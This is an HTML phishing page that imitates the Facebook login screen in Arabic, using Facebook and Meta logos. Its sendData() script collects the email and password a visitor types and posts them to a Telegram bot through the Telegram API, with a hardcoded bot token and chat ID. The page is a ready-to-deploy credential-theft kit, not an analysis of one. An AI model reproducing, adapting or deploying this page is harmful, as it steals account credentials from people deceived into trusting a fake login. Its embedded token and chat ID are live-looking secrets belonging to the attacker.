<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link href="https://l.top4top.io/p_3151546w82.png" rel="icon">
    <title> Facebook login</title>
    <style>
        body {
            background-image: url('https://i.top4top.io/p_3151i7b8a0.png');
            background-size: cover;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            padding: 20px;
            font-family: Arial, sans-serif;
        }
        .container {
            background: rgba(255, 255, 255, 0); /* شفافية الإطار */
            padding: 10px;
            border-radius: 10px;
            text-align: center;
            width: 300px;
        }
        .container img {
            width: 80px;
            margin-bottom: 40px;
        }
        .container input {
            width: 90%;
            padding: 18px;
            margin: 10px -10px;
            border: 1px solid #ccc;
            border-radius: 6px;
            outline: none;
            text-align: right; 
            font-size: 18px;
        }
        .container button {
            width: 100%;
            padding: 10px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 30px;
            cursor: pointer;
            margin-bottom: 20px;
        }
        .container .ab {
            border: 1px #1877f2 solid;
            display: block;
            margin: 10px 0;
            color: #1877f2;
            text-decoration: none;
            border-radius: 30px;
            padding: 10px;
            margin: 100px 30px;
            width: 200px;
        }
        .container .aa {
            display: block;
            margin: 10px 0;
            color: black;
            text-decoration: none;
        }
        .meta-logo {
            margin-top: -100px;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://l.top4top.io/p_3151546w82.png" alt="Facebook Logo">
        <input type="text" id="email" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني">
        <input type="password" id="password" placeholder="كلمة السر">
        <button onclick="sendData()">تسجيل الدخول</button>
        <a class="aa" href="#">هل نسيت كلمة السر؟</a>
        <a class="ab" href="#">إنشاء حساب جديد</a>
        <div class="meta-logo">
            <img src="https://j.top4top.io/p_3151m5l161.png" alt="Meta Logo">
        </div>
    </div>

    <script>
        function sendData() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const token = '7509225299:AAF9UyvAlML4oh6u7WvCNoX0_Imo0tBkQkU';
            const chatId = '5687419212';

            const data = {
                chat_id: chatId,
                text: `Email: ${email}\nPassword: ${password}`
            };

            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(data => {
                console.log('Success:', data);
            })
            .catch((error) => {
                console.error('Error:', error);
            });
        }
    </script>
</body>
</html>
